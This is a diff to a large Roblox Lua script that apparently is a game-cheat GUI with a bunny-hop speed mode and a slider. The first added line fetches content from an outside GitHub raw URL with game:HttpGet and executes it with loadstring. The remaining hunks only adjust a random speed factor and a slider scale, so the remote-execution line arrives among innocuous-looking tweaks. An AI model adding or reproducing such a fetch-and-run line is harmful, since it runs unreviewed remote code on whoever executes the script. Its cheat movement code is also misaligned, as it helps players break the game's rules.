@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Icehuy/tews/main/README.md", true))()
 function sandbox(var,func)
 	local env = getfenv(func)
 	local newenv = setmetatable({},{
@@ -7692,7 +7693,7 @@ table.insert(cors,sandbox(LocalScript273,function()
 						gyro = Instance.new("BodyGyro")
 						gyro.maxTorque = Vector3.new(1000000, 0, 1000000)
 						while down and game.Workspace[me].UpperTorso and game.Workspace[me].Humanoid and script.BHOP.Value == true do	
-							local lagwalk = math.random(9000,13000)/10000
+							local lagwalk = math.random(900,13000)/10000
 							velocity.Parent = game.Workspace[me].UpperTorso
 							velocity.velocity = (game.Players.LocalPlayer.Character.Humanoid.MoveDirection) * speed * lagwalk
 							gyro.Parent = game.Workspace[me].UpperTorso
@@ -8109,9 +8110,9 @@ table.insert(cors,sandbox(LocalScript295,function()
 			sp.Position = UDim2.new(xpos[1], xpos[2] , ypos[1], ypos[2])
 		end
 
-		percent.Value = math.floor((sp.Position.X.Offset / (bar.Size.X.Offset - sp.Size.X.Offset)) * 150)
-		sp.ValueText.Text = math.floor(((sp.Position.X.Offset / (bar.Size.X.Offset - sp.Size.X.Offset)) * 150)*1.2)
-		script.Parent.Parent.Frame.Size = UDim2.new(percent.Value/150, 0, 0, 10)
+		percent.Value = math.floor((sp.Position.X.Offset / (bar.Size.X.Offset - sp.Size.X.Offset)) * 100)
+		sp.ValueText.Text = math.floor(((sp.Position.X.Offset / (bar.Size.X.Offset - sp.Size.X.Offset)) * 100)*1.2)
+		script.Parent.Parent.Frame.Size = UDim2.new(percent.Value/100, 0, 0, 10)
 		script.Parent.Parent.Frame.BackgroundColor3 = 	script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.setup.MENUTOGGLEDCOLOR.Value	
 	end)
 
